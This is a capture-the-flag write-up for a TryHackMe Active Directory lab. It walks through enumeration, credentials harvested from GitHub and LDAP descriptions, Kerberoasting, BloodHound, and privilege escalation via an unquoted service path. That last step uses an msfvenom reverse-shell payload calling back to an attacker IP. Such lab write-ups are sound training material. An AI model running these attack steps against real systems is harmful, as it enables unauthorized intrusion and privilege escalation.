---
title: Enterprise
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Tryhackme - Active Directory
tags:
  - crackmapexec
  - impacket-lookupsid
  - grep
  - gawk
  - tee
  - smbclient
  - osint
  - kerberoasting
  - impacket-getuserspns
  - john
  - ldapdomaindump
  - xfreerdp
  - sharphound
  - bloodhound
  - hassession
  - seassignprimarytokenprivilege
  - certutil
  - powerup
  - unqouted-service-path
  - accesschk64
  - msfvenom
image: preview-image.png
media_subpath: /assets/img/Practice/Tryhackme - Active Directory/2025-05-31-enterprise/
---

This [room](https://tryhackme.com/room/enterprise) is made represent a real world seneriao but with CTF style. here we first enumerate-enumerate-enumerate but found nothing on the box, but next with OSINT we got the credentials for a user. with this its made possible for kerberoasting attack and have access to another user privileges. From here we are required to perfrom a local windows enumeration as of to elevate to admin privileges. and lastly exploit an unqouted service path.in my opinion this is a great box as it has some rabbit holes and really makes us think for initial foothold, although its a bit time consuming box.

* Hints:
  * if someone says its on github, its on github. (believe them)

## Enumeration

### Nmap

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p 53,88,139,135,80,593,636,3268,3269,3389,5357,5985,7990,9389,47001,49668,49666,49669,49670,49665,49664,49672,49676,49701,49709,49843 -Pn -A 10.10.122.200
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 23:53 PDT
Nmap scan report for 10.10.122.200
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-06 06:53:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-06T06:54:28+00:00
|_ssl-date: 2023-06-06T06:54:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2023-06-05T06:42:53
|_Not valid after:  2023-12-05T06:42:53
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Log in to continue - Log in with Atlassian account
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49843/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.25 seconds
```

* found nothing on DNS, LADP and RPC.

### HTTP - 80

* visiting IP in browser we got following page.

![](2025-05-31-enterprise-2.png)

* also using directory brute forcing we found `robots.txt` file which displayed following message.

![](2025-05-31-enterprise-3.png)

* nothing more was found here.

### SMB - 139

* on smb we enumerate shares and their access using crackmapexec.

```
crackmapexec smb 10.10.122.200 -u guest -p "" --shares
```

![](2025-05-31-enterprise-4.png)

* found information:
  * Windows 10.0 Build 17763
  * x64 base PC
  * PC name: LAB-DC
  * domain Name: LAB.ENTERPRISE.THM
  * SMB signing: True
  * IPC$ is readable and so 2 other unsual share named - `Docs` and `Users`.

### **IPC$**

* as here we have read access on IPC$ we can simple brute force SIDs and do username enumeration.

```bash
┌──(kali㉿kali)-[~/Desktop/Enterprise]
└─$ impacket-lookupsid anonymous@10.10.122.200 | tee usernames
Password:
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.122.200
[*] StringBinding ncacn_np:10.10.122.200[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2168718921-3906202695-65158103
500: LAB-ENTERPRISE\Administrator (SidTypeUser)
501: LAB-ENTERPRISE\Guest (SidTypeUser)
502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
1107: LAB-ENTERPRISE\nik (SidTypeUser)
1108: LAB-ENTERPRISE\replication (SidTypeUser)
1109: LAB-ENTERPRISE\spooks (SidTypeUser)
1110: LAB-ENTERPRISE\korone (SidTypeUser)
1111: LAB-ENTERPRISE\banana (SidTypeUser)
1112: LAB-ENTERPRISE\Cake (SidTypeUser)
1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
1117: LAB-ENTERPRISE\varg (SidTypeUser)
1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```

* next we can fetch for only usernames from the outputed file.

```bash
┌──(kali㉿kali)-[~/Desktop/Enterprise]
└─$ cat usernames | grep SidTypeUser  |gawk -F '\' '{ print $2 }' |gawk -F ' ' '{ print $1 }' |tee users    
Administrator
Guest
krbtgt
atlbitbucket
LAB-DC$
ENTERPRISE$
bitbucket
nik
replication
spooks
korone
banana
Cake
contractor-temp
varg
joiner
```

### **Users**

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient \\\\10.10.122.200\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Mar 11 18:11:49 2021
  ..                                 DR        0  Thu Mar 11 18:11:49 2021
  Administrator                       D        0  Thu Mar 11 13:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 00:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 14:53:06 2021
  bitbucket                           D        0  Thu Mar 11 18:11:51 2021
  Default                           DHR        0  Thu Mar 11 16:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 00:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 00:16:48 2018
  LAB-ADMIN                           D        0  Thu Mar 11 16:28:14 2021
  Public                             DR        0  Thu Mar 11 13:27:02 2021

		15587583 blocks of size 4096. 9916199 blocks available
```

* here its seems too look like it the `Users` folder from `C:\` directory.
* in here we are not able to look into all folders, instead just following ones.
  * Default
  * LAB-ADMIN
  * Desktop.ini (file)
* out of this LAB-ADMIN looks really interesting, thus first look at it.
* found the powershell history file.

![](2025-05-31-enterprise-5.png)

* this seems to have a creds - `replication:101RepAdmin123!!`
* so, lets check if this creds we have are valid.

![](2025-05-31-enterprise-6.png)

* nope, this creds are no good.

### **Docs**

* on Docs share found 2 files, out of which one is a `.docx` and another is `.xlsx` file.

![](2025-05-31-enterprise-7.png)

* both the file are password protected.
* for cracking the password we researched and found following article.
* [https://pentestcorner.com/cracking-microsoft-office-97-03-2007-2010-2013-password-hashes-with-hashcat/](https://pentestcorner.com/cracking-microsoft-office-97-03-2007-2010-2013-password-hashes-with-hashcat/)
* we did the same for the cracking purpose, but could find the password even after some time.
* thus left this files for later and moved on further.

### Port - 7990

* from nmap we got a unusual http port opening on 7990.
* visiting this in browser we found following page.

![](2025-05-31-enterprise-8.png)

* on this page we see a highlighted message: `Reminder to all Enterprise-THM Employees:We are moving to Github!`
* tried many thing here like:
  * researched about atlassian.
  * researched about bitbucket (as it showed to be connected in above research)
  * found RCE exploits (but authentication is required)
* but nothing seems to works as we need to first authenticate before moving any further.
* also when trying to authenticate with any email it just simply reloading the page
* also it not even sending any kind of data to backend. (like a POST request or something)
* thus lastly i googled for `Enterprise-THM` github page. (just in case)
* found the following page.

![](2025-05-31-enterprise-9.png)

* this has just one repository named `About Us` , which is not so interesting.
* but as soon as we see the peoples tab we have a user from our previous username list.
* this indicated that we are in right direction.
* thus moving further into `Nik-enterprise-dev`, we land into new github page of that user.

![](2025-05-31-enterprise-10.png)

* here too we have only one project.
* this project seems to be having a PowerShell script.

![](2025-05-31-enterprise-11.png)

* immidately we see it has 2 commits, and we jumped to see them.

![](2025-05-31-enterprise-12.png)

* the first one is the one we saw earlier, thus now lets the other one named - `Create SystemInfo.ps1`.

![](2025-05-31-enterprise-13.png)

* here if we see closely we see that is has a hardcoded credential in the script.
* and this is of the same user `nik`.
* `nik:ToastyBoi!`
* thus lets try and see if this creds are any good on our target domain.

![](2025-05-31-enterprise-14.png)

* and they seems to be working, aslo we have read access on new shares.

## Exploitation

* next to get a shell on target, I tried many methods but no luck.
* thus our last resolve - Kerberoasting Attack.

![](2025-05-31-enterprise-15.png)

* cracked this hash using john

![](2025-05-31-enterprise-16.png)

* thus another valid creds - `bitbucket:littleredbucket`
* now as we have bitbucket creds, it reminds me that we have the same users folder in `Users` share on SMB.
* thus let see if we can now access his folder.

![](2025-05-31-enterprise-17.png)

* and some more files.
* from here we went to desktop and fetched user falg.

![](2025-05-31-enterprise-18.png)

```
THM{ed882d02b34246536ef7da79062bef36}
```

## Post Exploitation

* from here too we tried to get a shell, but again no luck with any methods.
* thus lets try something else.
* for next we tried to see if we can dump any information from LDAPs as we are currently a valid user on target system.
* for this we used a tool called `ldapdomaindump`.

![](2025-05-31-enterprise-19.png)

![](2025-05-31-enterprise-20.png)

* interestingly found a users password in its description.
* hence creds for `contractor-temp` are - `Password123!`
* also if we see this user is a member of `Password-Policy-Exemption` group, which allows him to keep such a stupid password.
* also from this we found that we can RDP. (it did not work earlier)

![](2025-05-31-enterprise-21.png)

* eh let try again.

![](2025-05-31-enterprise-22.png)

![](2025-05-31-enterprise-23.png)

* and some how this time we got in.
* from here we will be using bloodhound to enumerate further on target domain.
* thus transfer `SharpHound.ps1` file to target.
* and now we collect using `All` methods and make a zip of collected data.

![](2025-05-31-enterprise-24.png)

* Fetched back the zip file to our attacker machine.
* uploaded the zip to bloodhound and marked all the found users as owned.
* next queried for analysis for shortest path to domain admins from owned principles.

![](2025-05-31-enterprise-25.png)

* it showed us above path where administrator has session on the current computer we are logged into. (which is basic the only computer in the network)
* right clicked on the edged and find help for this.

![](2025-05-31-enterprise-26.png)

* first we will be checking for RDP sessions as they are the most common to be find.
* Yay, we found a administrator’s RDP session.

![](2025-05-31-enterprise-27.png)

* but after some research we found in the [article](https://stmxcsr.com/micro/rdp-hijacking.html) that in order to perform RDP session hijacking we need to be local admin on the machine, which we are not with the current user.
* next we can do some basic windows enumeration for privilege escalation using winpeas and powerup.
* as RDP is unstable, we got a rev shell using a powershell command and close the RDP which stabizes the shell.
* form here when we tried to do get current user privileges, we found we have `SeAssignPrimaryTokenPrivilege`.
* thus meaning possible potato attack.
* we tried juciy and rouge potato attack but due to some reason both failed.
* and as this is a windows 2019 server we cannot perform any other potato attacks as they aren’t build for this.
* lastly ran PowerUp for auto enumeration.

![](2025-05-31-enterprise-28.png)

* immidately we found a unqouted service path, which we can control on demand.
* first lets check for service configuration and confirm if its vulnerable or not.

```powershell
sc qc zerotieroneservice
```

![](2025-05-31-enterprise-29.png)

* good its vulnerable, now lets check the service path permissions.
* for this we will need accesschk binary on target, thus transfer it over.

```
accesschk64.exe /accepteula -uwdq "C:\Program Files (x86)\Zero Tier\"
```

![](2025-05-31-enterprise-30.png)

* as we see that all BUILTIN\Users are allowed to read and write over this directory.
* thus now we create a malicious exectuable using msfvenom and place binary a folder below orgiginal binary with same as folder name.
* lastly we will be restarting the service to get back a rev shell.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.70.87 LPORT=4444 -f exe -o rev.exe
```

* send this executable over to target and paste it in `C:\Program Files (x86)\Zero Tier\` by naming it `Zero.exe`.

![](2025-05-31-enterprise-31.png)

* restart the service while starting a listener.

![](2025-05-31-enterprise-32.png)

![](2025-05-31-enterprise-33.png)

**NOTE: this shell might die sometimes as windows automatically closes any application/service that does not response for long.**

* and thus in our case as we are spawning a rev shell using this it might detect as not responding.
* thus to avoid this use meterpreter shell and migrate process as soon as we get the shell.
* and at last got root flag.

![](2025-05-31-enterprise-34.png)
